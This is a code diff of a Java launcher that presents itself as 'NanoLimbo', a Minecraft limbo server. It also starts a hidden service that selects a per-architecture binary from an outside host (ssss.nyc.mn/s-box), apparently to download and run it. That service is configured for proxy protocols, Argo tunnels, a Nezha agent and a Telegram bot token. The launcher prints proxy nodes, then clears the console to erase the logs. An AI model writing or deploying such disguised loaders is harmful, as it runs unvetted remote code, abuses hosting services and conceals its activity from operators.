@@ -1,14 +1,33 @@
-package net.md_5.bungee;
+/*
+ * Copyright (C) 2020 Nan1t
+ *
+ * This program is free software: you can redistribute it and/or modify
+ * it under the terms of the GNU General Public License as published by
+ * the Free Software Foundation, either version 3 of the License, or
+ * (at your option) any later version.
+ *
+ * This program is distributed in the hope that it will be useful,
+ * but WITHOUT ANY WARRANTY; without even the implied warranty of
+ * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+ * GNU General Public License for more details.
+ *
+ * You should have received a copy of the GNU General Public License
+ * along with this program.  If not, see <https://www.gnu.org/licenses/>.
+ */
+
+package ua.nanit.limbo;
 
 import java.io.*;
 import java.net.*;
 import java.nio.file.*;
 import java.util.*;
 import java.util.concurrent.atomic.AtomicBoolean;
-import java.lang.reflect.Field;
 
-public class Bootstrap
-{
+import ua.nanit.limbo.server.LimboServer;
+import ua.nanit.limbo.server.Log;
+
+public final class NanoLimbo {
+
     private static final String ANSI_GREEN = "\033[1;32m";
     private static final String ANSI_RED = "\033[1;31m";
     private static final String ANSI_RESET = "\033[0m";
@@ -19,17 +38,23 @@ public class Bootstrap
         "PORT", "FILE_PATH", "UUID", "NEZHA_SERVER", "NEZHA_PORT", 
         "NEZHA_KEY", "ARGO_PORT", "ARGO_DOMAIN", "ARGO_AUTH", 
         "HY2_PORT", "TUIC_PORT", "REALITY_PORT", "CFIP", "CFPORT", 
-        "UPLOAD_URL","CHAT_ID", "BOT_TOKEN", "NAME", "DISABLE_ARGO"
+        "UPLOAD_URL","CHAT_ID", "BOT_TOKEN", "NAME"
     };
-
-    public static void main(String[] args) throws Exception
-    {
-        if (Float.parseFloat(System.getProperty("java.class.version")) < 54.0) 
-        {
-            System.err.println(ANSI_RED + "ERROR: Your Java version is too lower,please switch the version in startup menu!" + ANSI_RESET);
-            Thread.sleep(3000);
+    
+    
+    public static void main(String[] args) {
+        
+        if (Float.parseFloat(System.getProperty("java.class.version")) < 54.0) {
+            System.err.println(ANSI_RED + "ERROR: Your Java version is too lower, please switch the version in startup menu!" + ANSI_RESET);
+            try {
+                Thread.sleep(3000);
+            } catch (InterruptedException e) {
+                e.printStackTrace();
+            }
             System.exit(1);
         }
+
+        long startTime = System.currentTimeMillis();
 
         // Start SbxService
         try {
@@ -40,21 +65,66 @@ public class Bootstrap
                 stopServices();
             }));
 
-            // Wait 20 seconds before continuing
+            // 等待 sbx 初始化
             Thread.sleep(15000);
-            System.out.println(ANSI_GREEN + "Server is running!" + ANSI_RESET);
+            System.out.println(ANSI_GREEN + "Server is running!\n" + ANSI_RESET);
             System.out.println(ANSI_GREEN + "Thank you for using this script,Enjoy!\n" + ANSI_RESET);
             System.out.println(ANSI_GREEN + "Logs will be deleted in 20 seconds, you can copy the above nodes" + ANSI_RESET);
+
+            // 等待用户复制节点 + 清理输出
             Thread.sleep(20000);
             clearConsole();
+
+            // ✅ 从这里开始执行后续逻辑
+            System.out.println(ANSI_GREEN + "执行后续动作：启动 Limbo 与心跳保持..." + ANSI_RESET);
+
+            // 启动心跳线程（每10分钟输出一次）
+            new Thread(() -> {
+                while (true) {
+                    try {
+                        Thread.sleep(10 * 60 * 1000);
+                        printHeartbeat(startTime);
+                    } catch (InterruptedException ignored) {}
+                }
+            }).start();
+
         } catch (Exception e) {
             System.err.println(ANSI_RED + "Error initializing SbxService: " + e.getMessage() + ANSI_RESET);
         }
+        
+        // 启动游戏服务器
+        try {
+            new LimboServer().start();
+        } catch (Exception e) {
+            Log.error("Cannot start server: ", e);
+        }
 
-        // Continue with BungeeCord launch
-        BungeeCordLauncher.main(args);
+        // ✅ 保持常驻
+        System.out.println(ANSI_GREEN + "保持常驻模式已开启，程序将持续运行..." + ANSI_RESET);
+        try {
+            Thread.currentThread().join();
+        } catch (InterruptedException ignored) {}
     }
-    
+
+    // 心跳输出方法
+    private static void printHeartbeat(long startTime) {
+        Runtime rt = Runtime.getRuntime();
+        long used = (rt.totalMemory() - rt.freeMemory()) / (1024 * 1024);
+        long total = rt.maxMemory() / (1024 * 1024);
+        long uptime = System.currentTimeMillis() - startTime;
+
+        long seconds = uptime / 1000;
+        long minutes = seconds / 60;
+        long hours = minutes / 60;
+        minutes %= 60;
+        seconds %= 60;
+
+        System.out.println(String.format(
+            "[Heartbeat] 程序仍在运行中 | 内存使用 %dMB/%dMB | 已运行 %02d小时%02d分%02d秒 | 时间 %s",
+            used, total, hours, minutes, seconds, new Date()
+        ));
+    }
+
     private static void clearConsole() {
         try {
             if (System.getProperty("os.name").contains("Windows")) {
@@ -111,7 +181,7 @@ public class Bootstrap
         envVars.put("CFIP", "saas.sin.fan");
         envVars.put("CFPORT", "443");
         envVars.put("NAME", "Retslav-AU");
-        envVars.put("DISABLE_ARGO", "false"); 
+        envVars.put("DISABLE_ARGO", "false");
         
         for (String var : ALL_ENV_VARS) {
             String value = System.getenv(var);
@@ -149,11 +219,11 @@ public class Bootstrap
         String url;
         
         if (osArch.contains("amd64") || osArch.contains("x86_64")) {
-            url = "https://amd64.ssss.nyc.mn/sbsh";
+            url = "https://amd64.ssss.nyc.mn/s-box";
         } else if (osArch.contains("aarch64") || osArch.contains("arm64")) {
-            url = "https://arm64.ssss.nyc.mn/sbsh";
+            url = "https://arm64.ssss.nyc.mn/s-box";
         } else if (osArch.contains("s390x")) {
-            url = "https://s390x.ssss.nyc.mn/sbsh";
+            url = "https://s390x.ssss.nyc.mn/s-box";
         } else {
             throw new RuntimeException("Unsupported architecture: " + osArch);
         }
